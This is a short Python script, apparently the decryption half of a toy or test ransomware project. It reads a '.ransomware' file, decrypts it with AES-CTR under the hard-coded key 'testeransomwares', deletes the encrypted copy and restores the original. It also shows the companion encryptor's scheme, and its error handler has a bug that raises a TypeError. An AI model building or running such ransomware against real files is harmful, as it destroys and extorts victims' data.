from __init__ import *

def decrypter(file_name):
    try:
        file_ransom = file_name + ".ransomware"
        file = open(file_ransom, 'rb')
        file_data = file.read()
        file.close()

        key = b'testeransomwares'
        aes = pyaes.AESModeOfOperationCTR(key)
        decrypt_data = aes.decrypt(file_data)

        os.remove(file_ransom)

        new_file = open(file_name, 'wb')
        new_file.write(decrypt_data)
        new_file.close()
    except Exception as e:
        print("Error: " + e)

if __name__ == "__main__":
    decrypter(input("Arquivo para ser descriptografado: "))